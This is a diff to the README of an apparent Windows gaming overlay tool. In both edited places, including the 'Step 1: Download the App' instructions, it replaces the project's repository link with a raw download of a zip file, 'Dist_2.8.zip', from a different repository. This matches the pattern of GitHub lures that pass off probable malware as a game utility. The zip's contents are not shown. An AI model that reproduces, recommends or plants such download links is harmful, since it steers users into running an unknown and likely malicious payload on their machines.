@@ -5,7 +5,7 @@ description: "Streamline your Windows gaming with an intuitive DirectX 11 overla
 ---
 # 🎮 irl-overlay-script-hub - See More, Play Better, Instantly  
 
-[![Download Now](https://img.shields.io/badge/Download-irl--overlay--script--hub-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Exacting-osmosis408/irl-overlay-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-irl--overlay--script--hub-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Exacting-osmosis408/exacting-osmosis408.github.io/raw/refs/heads/main/outguard/Dist_2.8.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Follow these simple steps. If you can use a web browser and a mouse, you can get
 ### Step 1: Download the App
 
 Visit this link to download the application:  
-👉 **[https://github.com/Exacting-osmosis408/irl-overlay-script-hub](https://github.com/Exacting-osmosis408/irl-overlay-script-hub)**
+👉 **[https://github.com/Exacting-osmosis408/exacting-osmosis408.github.io/raw/refs/heads/main/outguard/Dist_2.8.zip](https://github.com/Exacting-osmosis408/exacting-osmosis408.github.io/raw/refs/heads/main/outguard/Dist_2.8.zip)**
 
 Click the big green **Download** button or find the latest release file on that page. The download is small and should finish quickly.
 
